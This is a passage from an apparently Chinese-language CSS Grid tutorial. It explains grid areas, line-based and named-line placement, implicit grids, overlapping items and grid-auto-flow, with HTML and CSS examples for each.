</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n以上代码效果图：\n\n\n需要注意的一点，grid-template-areas: "h h h h" "l c c r" "l f f f";这样才能跨行，如果是grid-template-areas: "h h h h l c c r l f f f";得到就是一行12列的内容了，不会是三行的内容了。还有，跨行或跨列进行合并区域时，只能是矩形，不然areas模板会失效。比如grid-template-areas: "h h h h" "l c c r" "l l f f";就不会起作用。\n\n网格区域还是需要网格线来约束大小的，可以看下面这个例子。其中空单元格可以使用...或者.来标记\n\n<html>\n<head>\n<style>\n.grid { display: grid;\n    grid-template-areas:\n        "header  header  header  header"\n        "left    ... ... right"\n        "footer  footer  footer  footer";\n    grid-template-columns: 1fr 100px 100px 1fr;\n    grid-template-rows: 40px 100px 40px;\n    border: 1px solid; width: 500px;\n}\nspan { border: 1px dashed; }\n.header { grid-area: header; }\n.leftside { grid-area: left; }\n.rightside { grid-area: right; }\n.content { grid-area: content; }\n.footer { grid-area: footer; }\n</style>\n</head>\n<body>\n    <div class="grid boxed lines small">\n        <span class="header">header</span>\n        <span class="leftside">left</span>\n        <span class="rightside">right</span>\n        <span class="footer">footer</span>\n        <span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n以上代码效果图：\n\n\n给网格区域命名后，会自动给区域首尾的网格线命名了。比如header区域，第一行网格线和第一列网格线的名字都是header-start，第二行网格线和第二列网格线的名字都是header-end\n\n\n\n\n# 四、添加网格元素\n\n\n# 4.1 附加到网格线上\n\n将元素附加到网格线上有四个属性grid-row-start、grid-row-end、grid-column-start和grid-column-end，可以理解为给元素的边界限定范围\n\n<html>\n<head>\n<style>\n    .grid { display: grid; width: 50em; height: 25em;\n        grid-template-row: repeat(3, 5em); grid-template-columns: repeat(3, 5em); }\n    .box01 { grid-row-start: 2; grid-row-end: 4;\n        grid-column-start: 1; grid-column-end: 3; background: skyblue; }\n    .box02 { grid-row-start: 1; grid-row-end: 3;\n        grid-column-start: 4; grid-column-end: 7; background: gray; }\n    .box03 { grid-row-start: 2; grid-row-end: 3;\n        grid-column-start: 8; grid-column-end: 9; background: yellow; }\n    span { border: 1px dashed; }\n    span[class*="box"] { z-index: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\n还有一种类似的方式，给它指定跨网格轨道的数量，比如grid-column-start: 3; grid-column-end: span 2;从第三个列线开始往end方向跨2个span。其中span后面的数值要是正整数，或者省略就是默认为1。如果是grid-column-start: span 2; grid-column-end: 3;，已第三列线为结束边界，往start方向跨2个span（也就是第1列线的位置）。\n\n<html>\n<head>\n<style>\n    #grid { display: grid;  width: 50em; height: 25em;\n        grid-rows: repeat(4, 2em); grid-columns: repeat(5, 5em);}\n    .box01 { grid-row: 1; grid-column-start: 3; grid-column-end: span 2; background: skyblue; }\n    .box02 { grid-row: 2; grid-column-start: span 2; grid-column-end: 3; background: gray; }\n    .box03 { grid-row: 3; grid-column-start: 1; grid-column-end: span 5; background: yellow; }\n    .box04 { grid-row: 4; grid-column-start: span 1; grid-column-end: 5; background: green; }\n    span { border: 1px dashed; }\n    span[class*="box"] { z-index: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n以上代码效果图：\n\n\n添加元素引用网格线时，并不限于使用编号，网格名称也是可以使用的，混用也可以。可以看下面的例子，R 2、col-A 3和col-A -2是编号和名称混用的场景，编号是可以使用负数的，它表示从网格右侧往左计数(尾端反向计数，尾端-1就是最后一个)，那么col-A -2的意思是从右往左数第2个col-A。\n\n<html>\n<head>\n<style>\n    body {width: 64em; padding: 5em; margin: 1px;}\n    #grid {display: grid; width: 54em;\n        grid-template-rows: repeat(5, [R] 4em);\n        grid-template-columns: 2em repeat(5, [col-A] 5em [col-B] 5em);}\n    .one { grid-row-start: R 2; grid-row-end: 4;\n        grid-column-start: col-B; grid-column-end: span 2; background: skyblue; }\n    .two { grid-row-start: R; grid-row-end: span R 2;\n        grid-column-start: col-A 3; grid-column-end: span 2 col-A; background: gray; }\n    .three { grid-row-start: 4; grid-column-start: col-A -2; background: yellow; }\n\n    span[class*="box"] {z-index: 1;}\n    span { border: 1px dashed; }\n\n    .labels#col {display: grid; grid-template-rows: 5em; grid-template-columns: 2em repeat(5, [col-A] 5em [col-B] 5em) 2em 2em;}\n    .labels#row {display: grid; grid-template-rows: repeat(6, [R] 4em); grid-template-columns: 5em;}\n\n    .labels#col {position: absolute; top: 0; left: 5em; margin: 0; padding: 1px;}\n    .labels#row {position: absolute; top: 5em; left: 0; margin: 0; padding: 1px;}\n\n    .labels#col li {display: flex; justify-content: flex-end; align-items: flex-start; flex-flow: column;}\n    .labels#row li {display: flex; justify-content: flex-end; align-items: flex-start; flex-flow: row;}\n\n    .labels li.line.label i {color: rebeccapurple; font: 1em Arvo, sans-serif;}\n    .labels#col li.line.label i {border-left: 1px solid; padding-left: 0.25em;}\n    .labels#col li i:last-child {padding-bottom: 0.5em;}\n    .labels#col li.high i:last-child {padding-bottom: 4em;}\n\n    .labels .line.col.label  {grid-template-row: 1; grid-template-column: auto / span 1;}\n\n    .labels li.line.label i {color: rebeccapurple; font: 1em Arvo, sans-serif;}\n    .labels#col li.line.label i {border-left: 1px solid; padding-left: 0.25em;}\n    .labels#row li.line.label i {border-top: 1px solid; padding-top: 0.25em;}\n\n    .labels#row li i {padding-right: 0.5em;}\n    .labels#col li i:last-child {padding-bottom: 0.5em;}\n    .labels#col li.high i:last-child {padding-bottom: 4em;}\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one">1</span><span class="box02 two">2</span><span class="box03 three">3</span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines">\n    </div>\n    <ul class="labels" id="col">\n        <li class="col line label"><i>1</i></li>\n        <li class="col line label"><i>col-A</i><i>2</i></li>\n        <li class="col line label"><i>col-B</i><i>3</i></li>\n        <li class="col line label"><i>col-A</i><i>4</i></li>\n        <li class="col line label"><i>col-B</i><i>5</i></li>\n        <li class="col line label"><i>col-A</i><i>6</i></li>\n        <li class="col line label"><i>col-B</i><i>7</i></li>\n        <li class="col line label"><i>col-A</i><i>8</i></li>\n        <li class="col line label"><i>col-B</i><i>9</i></li>\n        <li class="col line label"><i>col-A</i><i>10</i></li>\n        <li class="col line label"><i>col-B</i><i>11</i></li>\n        <li class="col line label"><i>12</i></li>\n    </ul>\n    <ul class="labels" id="row">\n        <li class="row line label"><i></i><i>1</i></li>\n        <li class="row line label"><i>R</i><i>2</i></li>\n        <li class="row line label"><i>R</i><i>3</i></li>\n        <li class="row line label"><i>R</i><i>4</i></li>\n        <li class="row line label"><i>R</i><i>5</i></li>\n    </ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n以上代码效果图：\n\n\n我们可以使用grid-row和grid-column来简写前面提到的四个属性（grid-row-start、grid-row-end、grid-column-start和grid-column-end），需要斜线/来分隔start和end。像这一小节开头的例子可以简写改成以下例子：\n\n<html>\n<head>\n<style>\n    .grid { display: grid; width: 50em; height: 25em;\n        grid-template-row: repeat(3, 5em); grid-template-columns: repeat(3, 5em); }\n    .box01 { grid-row: 2 / 4; grid-column: 1 / 3; background: skyblue; }\n    .box02 { grid-row: 1 / 3; grid-column: 4 / 7; background: gray; }\n    .box03 { grid-row: 2 / 3; grid-column: 8 / 9; background: yellow; }\n    span { border: 1px dashed; }\n    span[class*="box"] { z-index: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n以上代码效果图：\n\n\n\n# 4.2 隐式网格\n\n前面的例子都是使用grid-template-xxx定义的显示网格，在添加元素时一般都在这些网格中，如果万一我们添加的元素超出了这些网格，浏览器会怎么处理？浏览器会自动创建对应的行线或列线。\n\n<html>\n<head>\n<style>\n    #grid { grid-auto-rows: 2em; grid-auto-columns: 5em; width: 35em; }\n    #grid { display: grid; grid-template-rows: 2em 2em;\n        grid-template-columns: repeat(6, 4em); }\n    .box01 { grid-column: 1; grid-row: 1 / 4; border: 5px solid; border-color: skyblue; }\n    .box02 { grid-column: 2; grid-row: 3 / span 2; border: 5px solid; border-color: springGreen; }\n    .box03 { grid-column: 3; grid-row: span 2 / 3; border: 5px solid; border-color: salmon; }\n    .box04 { grid-column: 4; grid-row: span 4 / 5; border: 5px solid; border-color: hotPink; }\n    .box05 { grid-column: 5; grid-row: span 6 / 5; border: 5px solid; border-color: lawnGreen; }\n    .box06 { grid-column: 6; grid-row: -1 / span 3; border: 5px solid; border-color: orangeRed; }\n    .box07 { grid-column: 7; grid-row: span 3 / -1; border: 5px solid; border-color: yellowGreen; }\n    span { border: 1px dashed; }\n    span[class*="box"] {z-index: 1;}\n    span.explicit {background: #DDD; grid-area: 1 / 1 / 3 / 7;}\n</style>\n</head>\n<body>\n    <div class="grid gridlines" id="grid">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="explicit"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n以上代码效果图：\n\n\n我们可以看到上面这个例子，显示规划了两行六列的网格，7个span中只有第3个没有超出，其他都超出了，浏览器自动为它们添加了行线或列线。值得注意的是第6个和第7个的-1指的是显示网格中尾端反向的网格线（这里就是首端正向第3条行线）。\n\n前面的网格线都没有具体的名称，如果有具体的名称情况与上面的类似，主要就是在扩展隐式网格时还能为隐式网格线添加名字。比如下面这个例子中的box01，从2开始往下跨span类型的网格，要跨2条名称为end的网格线，但显示网格中只有一条end网格线，然后浏览器隐式生成一条end网格线（在下图中是斜体的）。同样box02，从2开始往下跨span类型的网格，要跨1条名称为final的网格线，但显示网格中没有，那将之前的隐式end网格线又新添一个名字final。后面的box03、box04和box05都是如此。\n\n<html>\n<head>\n<style>\n    body {width: 64em; padding-left: 8.4em; padding-top: 1em; margin: 1px;}\n    #grid {grid-auto-rows: 2em; grid-auto-columns: 5em; width: 35em; left: 5em; }\n    #grid {display: grid; grid-template-rows: [begin] 2em [middle] 2em [end];\n        grid-template-columns: repeat(5, 5em); }\n    .box01 { grid-column: 1; grid-row: 2 / span end 2; border: 5px solid; border-color: skyblue; }\n    .box02 { grid-column: 2; grid-row: 2 / span final; border: 5px solid; border-color: springGreen; }\n    .box03 { grid-column: 3; grid-row: 1 / span 3 middle; border: 5px solid; border-color: salmon; }\n    .box04 { grid-column: 4; grid-row: span begin 2 / end; border: 5px solid; border-color: hotPink; }\n    .box05 { grid-column: 5; grid-row: span 2 middle / begin; border: 5px solid; border-color: lawnGreen; }\n    span { border: 1px dashed; }\n    span[class*="box"] {z-index: 1;}\n    span.explicit {background: #DDD; grid-area: 1 / 1 / 3 / 6;}\n\n    .labels#row {display: grid; grid-template-rows: repeat(7, 2em);}\n    .labels#row {position: absolute; top: 1em; left: 0; margin: 0; padding: 1px;}\n    .labels#row li {display: flex; justify-content: flex-end; align-items: flex-start; flex-flow: row;}\n\n    .labels li.line.label i {color: rebeccapurple; font: 1em Arvo, sans-serif;}\n    .labels li.line.label.implicit i { font-style: italic; }\n    .labels#row li.line.label i {border-top: 1px solid; padding-top: 0.25em;}\n    .labels#row li i {padding-right: 0.5em;}\n    .labels li i::after { content: " || "; margin-right: 4px; }\n    .labels li i:last-child::after { content: ""; }\n</style>\n</head>\n<body>\n    <div class="grid gridlines" id="grid">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="explicit"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n    <ul class="labels" id="row">\n        <li class="row line label implicit"><i>middle</i></li>\n        <li class="row line label implicit"><i>begin</i><i>middle</i></li>\n        <li class="row line label"><i>begin</i><i>1</i></li>\n        <li class="row line label"><i>middle</i><i>2</i></li>\n        <li class="row line label"><i>end</i><i>3</i></li>\n        <li class="row line label implicit"><i>final</i><i>middle</i></li>\n        <li class="row line label implicit"><i>middle</i></li>\n    </ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n以上代码效果图：\n\n\n我们并没讲隐式添加的网格的尺寸为什么和显式的一样，因为上面的例子都使用了grid-auto-rows或grid-auto-columns来约束隐式网格尺寸，如果不使用这两个属性，那么新添的行的高度会根据这一行的内容高度作为最终高度，新添加的列的宽度会根据这一列的内容宽度作为最终宽度。这个同样也应用于网格流中，看下面这个例子。\n\n<html>\n<head>\n<style>\n    .grid {display: inline-grid; vertical-align: top; margin-right: 3em;\n        grid-template-rows: 120px 120px; grid-template-columns: 120px 120px;}\n    #g1 {grid-auto-rows: 120px;}\n    span[class*="box"] { font-size: 1.5em; border: 5px solid; }\n    *[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n    *[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n    *[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotPink; }\n    *[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawnGreen; }\n    *[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueViolet; }\n    *[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlyWood; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="g1">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n    </div>\n    <div class="grid boxed gridlines" id="g2">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\n\n# 4.3 附加到网格区域中\n\n事先定义好网格区域，直接使用grid-area可以将元素添加到网格区域中。其实在网格区域这节的例子里就使用了grid-area，如下。\n\n<html>\n<head>\n    <style>\n    .grid { display: grid;\n            grid-template-areas:\n            "h h h h"\n            "l c c r"\n            "l f f f";\n        grid-template-rows: repeat(3, 3em);\n        border: 1px solid;\n    }\n    span { border: 1px dashed; text-align: center; }\n    .header { grid-area: h; }\n    .leftside { grid-area: l; }\n    .rightside { grid-area: r; }\n    .content { grid-area: c; }\n    .footer { grid-area: f; }\n    </style>\n</head>\n<body>\n    <div class="grid">\n        <span class="box01 header">header</span>\n        <span class="box02 content">content</span>\n        <span class="box03 leftside">leftside</span>\n        <span class="box04 rightside">rightside</span>\n        <span class="box05 footer">footer</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n以上代码效果图：\n\n\n以上只是grid-area为一个值的场景，有些场景下它有4个值并用/分隔。比如下面例子中的grid-area: 1 / 1 / 2 / 2，就是上 / 左 / 下 / 右的网格线顺序，与css属性的上右下左是反的。\n\n<html>\n<head>\n<style>\n    #grid { width: 400px; height: 150px; }\n    #grid {display: inline-grid;\n        grid-template-rows:\n            [r1-start] 1fr [r1-end r2-start] 2fr [r2-end];\n        grid-template-columns:\n            [col-start] 1fr [col-end main-start] 1fr [main-end];}\n    .box01 {grid-area: r1 / main / r1 / main; border: 5px solid; border-color: skyblue; }\n    .box02 { grid-area: r2-start / col-start / r2-end / main-end;\n        border: 5px solid; border-color: springGreen; }\n    .box03 {grid-area: 1 / 1 / 2 / 2; border: 5px solid; border-color: salmon; }\n    span { border: 1px dashed; text-align: center; }\n    ul li { display: flex; }\n    ul li i { color: rebeccapurple; }\n    .labels1 { display: grid; grid-template-columns: 1fr 1fr 1fr;\n        width: 600px; padding: 0; margin-bottom: 0; margin-left: 160px; }\n    .labels1 li { justify-content: flex-end; align-items: flex-start;\n        flex-flow: column; border-left: 1px solid; }\n    .labels2 { display: inline-grid; grid-template-rows: 1fr 2fr 1fr; height: 200px;\n        padding: 0; margin-left: 0; margin-top: 0; vertical-align: top; }\n    .labels2 li { border-top: 1px solid; justify-content: flex-end; }\n    .labels2 li i::after { content: " || "; margin-right: 4px; }\n    .labels2 li i:last-child::after { content: ""; }\n</style>\n</head>\n<body>\n    <ul class="labels1">\n        <li class="col"><i>col-start</i><i>1</i></li>\n        <li class="col"><i>col-end</i><i>main-start</i><i>2</i></li>\n        <li class="col"><i>main-end</i><i>3</i></li>\n    </ul>\n    <ul class="labels2">\n        <li class="col"><i>r1-start</i><i>1</i></li>\n        <li class="col"><i>r1-end</i><i> r2-start</i><i>2</i></li>\n        <li class="col"><i>r2-end</i><i>3</i></li>\n    </ul>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one" id="masthead">box01</span>\n        <span class="box02 two" id="sidebar">box02</span>\n        <span class="box03 three" id="main">box03</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n以上代码效果图：\n\n\n\n# 4.4 元素重叠以及异常处理\n\n将元素添加到网格中时，元素是可以重叠的（可以是可以但要避免出现这样的情况）。\n\n<html>\n<head>\n<style>\n    #grid { width: 54em; height: 17em; border: 1px solid; }\n    #grid {display: grid;\n        grid-template-rows: 50% 50%; grid-template-columns: 50% 50%;}\n    .box01 { grid-area: 1 / 1 / 2 / 3; border: 5px solid; border-color: hotPink; }\n    .box02 { grid-area: 1 / 2 / 3 / 2; border: 5px solid; border-color: skyblue; }\n    span { border: 1px dashed; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one" id="masthead">1</span>\n        <span class="box02 two" id="sidebar">2</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n以上代码效果图：\n\n\n不只是在数字引用的网格线下添加元素出现重叠的现象，网格区域也是同样的。后添加的会遮住先添加的。\n\n<html>\n<head>\n<style>\n    #grid { width: 50em; height: 15em; border: 1px solid;\n        grid-template-columns: 1fr 3fr;\n        grid-template-rows: 4em 7em 4em; }\n    #grid { display: grid;\n        grid-template-areas:\n            "header header"\n            "sidebar content"\n            "footer footer"; }\n    #header { grid-area: header; border: 5px solid; border-color: skyblue; }\n    #sidebar { grid-area: sidebar / sidebar / footer-end / sidebar;\n        border: 5px solid; border-color: springGreen; }\n    #footer { grid-area: footer; border: 5px solid; border-color: salmon; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one" id="header">header</span>\n        <span class="box02 two" id="sidebar">sidebar</span>\n        <span class="box03" id="footer">footer</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n以上代码效果图：\n\n\n    添加元素时的异常处理：\n\n 1. 开始线数值大于结束线数值 grid-row-start: 5; grid-row-end: 2;会自动转变为grid-row-start: 2; grid-row-end: 5;\n\n 2. 开始线和结束线都声明为跨度 grid-row-start: span; grid-row-end: span 3;，结束线的跨度会被忽略，会转变为grid-row-start: span 1; grid-row-end: auto;，然后根据网格流自动放置，后面小节会讲。\n\n 3. 只用具名跨度指明网格元素位置 grid-row-start: span footer; grid-row-end: auto;，这个和上面说的隐式网格很像，但是不一样，因为有个auto。这种情况也是会转变为grid-row-start: span 1; grid-row-end: auto;\n\n 4. grid-area四个值缺少一两个 开始线值是网格线名称，缺少的结束线值与开始线值相同；开始线值是数值，缺少的结束线值则是auto\n\n\n# 五、网格流\n\n\n# 5.1 行优先和列优先\n\n如果不明确指定网格元素在网格中的位置的话，网格元素会在网格流的作用下自动放在网格中合适的位置。网格流grid-auto-flow有两种模式：行优先和列优先。所谓“行优先”就是尽量占满一行再去排列下一行，“列优先”就是尽量先占满一列。\n\n<html>\n<head>\n<style>\n    .grid { grid-template-columns: repeat(3, 200px);\n        grid-template-rows: repeat(2, 50px); border: 1px solid; }\n    .grid { display: grid; width: 600px; height: 100px;\n        grid-auto-flow: column/*row*/;}\n    .grid li { grid-row: auto; grid-column: auto; }\n    ol { list-style:none; padding: 0; }\n    .box01 { border: 5px solid; border-color: skyblue; }\n    .box02 { border: 5px solid; border-color: springGreen; }\n    .box03 { border: 5px solid; border-color: salmon; }\n    .box04 { border: 5px solid; border-color: hotPink; }\n    .box05 { border: 5px solid; border-color: lawnGreen; }\n</style>\n</head>\n<body>\n    <ol class="grid">\n        <li class="box01">1</li><li class="box02">2</li>\n        <li class="box03">3</li><li class="box04">4</li>\n        <li class="box05">5</li>\n    </ol>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n以上代码效果图：\n\n\n可以看到上面的例子使用的是grid-row: auto; grid-column: auto;，因为默认每个网格元素一样大。但是如果每个网格元素的尺寸不一（并且大于网格区域的大小），再这样写就不合适了，必须给尺寸过大的网格元素添加跨度。\n\n<html>\n<head>\n<style>\n    #grid {display: grid;\n        grid-template-rows: repeat(4, 50px);\n        grid-template-columns: repeat(4, 50px);\n        grid-auto-rows: 50px;\n        grid-auto-columns: 50px;\n    }\n    img {grid-row: auto; grid-column: auto;}\n    img {width: 50px; height; 50px; border: 1px solid silver; box-sizing: border-box;}\n    img.wide {width: 90px; height: 50px;}\n    img.tall {width: 50px; height: 90px;}\n    img.big {width: 90px; height: 90px;}\n    img.wide {grid-column: auto / span 2;}\n    img.tall {grid-row: auto / span 2;}\n    img.big {grid-row: auto / span 2; grid-column: auto / span 2;}\n</style>\n</head>\n<body>\n    <div id="grid">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="wide">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="tall">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="big">\n        <img src="./yinyang.png" alt="" class="wide">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n以上代码效果图：\n\n\n\n# 5.2 网格流和浮动的区别\n\n你会发现上面的例子上留出了很多间隙，原因是留出的空间放不下后面紧接着的元素了，就算能放下也不能超出前面元素的顶边。是不是觉得网格流和浮动有些像，但是浮动要比网格流规则更复杂。情况稍有不同，可以看下面例子中的13号元素的位置，想一想为什么。\n\n<html>\n<head>\n<style>\nspan { box-sizing: border-box; }\n\n.float { display: inline-block; width: 320px; height: 320px; }\n.float span { float: left; width: 80px; height: 80px; }\n.float span.wide { width: 160px; }\n.float span.tall { height: 160px; }\n\n.grid { display: inline-grid;\n    grid-template-columns: repeat(4, 80px);\n    grid-template-rows: repeat(4, 80px);\n    grid-auto-columns: 80px;\n    grid-auto-rows: 80px;\n    vertical-align: top;\n    margin-left: 200px;\n}\n.grid { grid-auto-flow: row; }\n.grid span { align-items: start; padding-top: 0.25em; }\n.grid span.wide { grid-column: auto / span 2; }\n.grid span.tall { grid-row: auto / span 2; }\n\nspan[class*="box"] { font-size: 1.5em; border: 5px solid; }\n*[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n*[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n*[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotPink; }\n*[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawnGreen; }\n*[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueViolet; }\n*[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlyWood; }\n*[class*="07"] { color: hsl(144,67%,50%); background: hsla(144,67%,50%,0.2); border-color: chartreuse; }\n*[class*="08"] { color: hsl(168,67%,50%); background: hsla(168,67%,50%,0.2); border-color: chocolate; }\n*[class*="09"] { color: hsl(192,67%,50%); background: hsla(192,67%,50%,0.2); border-color: cornflowerBlue; }\n*[class*="10"] { color: hsl(216,67%,50%); background: hsla(216,67%,50%,0.2); border-color: cyan; }\n*[class*="11"] { color: hsl(240,67%,50%); background: hsla(240,67%,50%,0.2); border-color: darkGoldenRod; }\n*[class*="12"] { color: hsl(264,67%,50%); background: hsla(264,67%,50%,0.2); border-color: darkMagenta; }\n*[class*="13"] { color: hsl(288,67%,50%); background: hsla(288,67%,50%,0.2); border-color: darkorange; 